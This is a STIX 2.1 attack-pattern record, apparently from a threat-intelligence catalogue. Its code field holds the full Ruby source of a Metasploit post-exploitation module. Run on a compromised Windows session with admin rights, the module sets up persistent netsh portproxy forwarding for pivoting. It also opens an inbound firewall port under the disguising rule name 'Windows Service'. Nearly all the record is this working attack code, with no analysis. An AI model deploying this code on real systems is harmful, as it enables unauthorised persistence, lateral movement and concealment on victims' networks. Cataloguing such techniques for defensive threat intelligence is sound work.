{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--47d2d5bc-8803-4d69-ba00-6baca76e433b",
    "created": "2024-08-14T16:33:04.970215Z",
    "modified": "2024-08-14T16:33:04.970218Z",
    "name": "Windows Manage Set Port Forwarding With PortProxy",
    "description": " This module uses the PortProxy interface from netsh to set up port forwarding persistently (even after reboot). PortProxy supports TCP IPv4 and IPv6 connections.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/portproxy.rb",
            "external_id": "portproxy.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Set Port Forwarding With PortProxy',\n        'Description' => %q{\n          This module uses the PortProxy interface from netsh to set up\n          port forwarding persistently (even after reboot). PortProxy\n          supports TCP IPv4 and IPv6 connections.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptAddress.new('LOCAL_ADDRESS', [ true, 'IPv4/IPv6 address to which to listen.']),\n        OptAddress.new('CONNECT_ADDRESS', [ true, 'IPv4/IPv6 address to which to connect.']),\n        OptPort.new('CONNECT_PORT', [ true, 'Port number to which to connect.']),\n        OptPort.new('LOCAL_PORT', [ true, 'Port number to which to listen.']),\n        OptBool.new('IPV6_XP', [ true, 'Install IPv6 on Windows XP (needed for v4tov4).', true]),\n        OptEnum.new('TYPE', [ true, 'Type of forwarding', 'v4tov4', ['v4tov4', 'v6tov6', 'v6tov4', 'v4tov6']])\n      ]\n    )\n  end\n\n  def run\n    if !is_admin?\n      print_error(\"You don't have enough privileges. Try getsystem.\")\n      return\n    end\n\n    # Due to a bug in Windows XP you need to install IPv6\n    # http://support.microsoft.com/kb/555744/en-us\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::XP_SP0, Msf::WindowsVersion::XP_SP2) && !check_ipv6\n      return\n    end\n\n    return unless enable_portproxy\n\n    fw_enable_ports\n  end\n\n  def enable_portproxy\n    rtable = Rex::Text::Table.new(\n      'Header' => 'Port Forwarding Table',\n      'Indent' => 3,\n      'Columns' => ['LOCAL IP', 'LOCAL PORT', 'REMOTE IP', 'REMOTE PORT']\n    )\n\n    print_status('Setting PortProxy ...')\n    netsh_args = 'interface portproxy '\n    netsh_args << \"add #{datastore['TYPE']} \"\n    netsh_args << \"listenport=#{datastore['LOCAL_PORT']} \"\n    netsh_args << \"listenaddress=#{datastore['LOCAL_ADDRESS']} \"\n    netsh_args << \"connectport=#{datastore['CONNECT_PORT']} \"\n    netsh_args << \"connectaddress=#{datastore['CONNECT_ADDRESS']}\"\n    output = cmd_exec('netsh', netsh_args)\n    if output.size > 2\n      print_error('Setup error. Verify parameters and syntax.')\n      return false\n    else\n      print_good('PortProxy added.')\n    end\n\n    output = cmd_exec('netsh', 'interface portproxy show all')\n    output.each_line do |l|\n      rtable << l.split(' ') if l.strip =~ /^[0-9]|\\*/\n    end\n    print_status(rtable.to_s)\n    return true\n  end\n\n  def ipv6_installed\n    output = cmd_exec('netsh', 'interface ipv6 show interface')\n    if output.lines.count > 2\n      return true\n    else\n      return false\n    end\n  end\n\n  def check_ipv6\n    if ipv6_installed\n      print_status('IPv6 is already installed.')\n      return true\n    elsif !datastore['IPV6_XP']\n      print_error('IPv6 is not installed. You need IPv6 to use portproxy.')\n      print_status('IPv6 can be installed with \"netsh interface ipv6 install\"')\n      return false\n    else\n      print_status('Installing IPv6... can take a little long')\n      cmd_exec('netsh', 'interface ipv6 install', 120)\n      if !ipv6_installed\n        print_error('IPv6 was not successfully installed. Run it again.')\n        return false\n      end\n      print_good('IPv6 was successfully installed.')\n      return true\n    end\n  end\n\n  def fw_enable_ports\n    print_status(\"Setting port #{datastore['LOCAL_PORT']} in Windows Firewall ...\")\n    version = get_version_info\n    if version.build_number >= Msf::WindowsVersion::Vista_SP0\n      cmd_exec('netsh', \"advfirewall firewall add rule name=\\\"Windows Service\\\" dir=in protocol=TCP action=allow localport=\\\"#{datastore['LOCAL_PORT']}\\\"\")\n    else\n      cmd_exec('netsh', \"firewall set portopening protocol=TCP port=\\\"#{datastore['LOCAL_PORT']}\\\"\")\n    end\n    output = cmd_exec('netsh', 'firewall show state')\n\n    if output =~ /^#{datastore['LOCAL_PORT']} /\n      print_good('Port opened in Windows Firewall.')\n    else\n      print_error('There was an error enabling the port.')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}